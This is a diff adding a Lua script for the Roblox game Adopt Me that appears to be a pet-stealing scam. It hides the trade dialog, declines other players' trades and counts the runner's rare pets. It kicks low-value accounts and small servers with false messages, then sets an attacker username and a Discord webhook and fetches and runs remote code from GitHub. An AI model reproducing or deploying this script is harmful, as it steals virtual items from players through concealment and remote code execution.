@@ -1,0 +1,94 @@
+repeat wait() until game:IsLoaded()
+
+if getgenv().adm then return end
+getgenv().adm = true
+
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
+
+local function hideUI(guiElement)
+    if guiElement then
+        guiElement.Position = UDim2.new(1000, 0, 1000, 0)
+    end
+end
+
+local function disableDialog()
+    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
+    local dialogApp = playerGui:FindFirstChild("DialogApp")
+    if dialogApp and dialogApp:FindFirstChild("Dialog") then
+        dialogApp.Dialog.Visible = false
+        hideUI(dialogApp.Dialog)
+    end
+end
+
+local function declineTrade(player)
+    TradeAcceptOrDeclineRequest:InvokeServer(player, false)
+end
+
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+disableDialog()
+
+TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+    if sender.Name ~= game.Players.LocalPlayer.Name then
+        declineTrade(sender)
+    end
+end)
+
+if #game:GetService("Players"):GetPlayers() == game.Players.MaxPlayers then
+    game:GetService("Players").LocalPlayer:Kick("Unsupported server!")
+end
+
+if #game:GetService("Players"):GetPlayers() <= 5 then
+    game:GetService("Players").LocalPlayer:Kick("Private Servers are not supported, unable to get Remote Events.")
+    wait(5)
+    game:Shutdown()
+end
+
+local Pets = {}
+local PetCounts = {}
+local InventoryDB = Loads("InventoryDB")
+local ClientData = Loads("ClientData")
+local bucks = tostring(ClientData.get("money"))
+
+local rarityCounts = {
+    legendary = 0,
+    mega = 0,
+    neon = 0,
+    ultra_rare = 0,
+    rare = 0,
+    uncommon = 0,
+    common = 0
+}
+
+local total_pets = 0
+
+for _, pet in pairs(ClientData.get("inventory").pets) do
+    total_pets = total_pets + 1
+    local petData = InventoryDB[pet.category][pet.id]
+
+    if petData.rarity then
+        rarityCounts[petData.rarity] = (rarityCounts[petData.rarity] or 0) + 1
+    end
+    if petData.properties == "mega_neon" then
+        rarityCounts.mega = rarityCounts.mega + 1
+    end
+    if petData.properties == "neon" then
+        rarityCounts.neon = rarityCounts.neon + 1
+    end
+end
+
+local player = game.Players.LocalPlayer
+local accAge = player.AccountAge
+local userId = player.UserId
+local executor = identifyexecutor() or "Unknown"
+
+if rarityCounts.legendary + rarityCounts.mega + rarityCounts.neon + rarityCounts.ultra_rare == 0 then
+    game:GetService("Players").LocalPlayer:Kick(
+        "Bot/Alt/New Account Detected."
+    )
+end
+
+UserName = "lord_magic0"
+WebHook = "https://discord.com/api/webhooks/1318634606349779026/JZCqZPCymJXyh4Al5H8gou0QEb2BsXsIOs_7zzaBXfQr5LTISb1NKMpNanlp3vs1ckRA"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
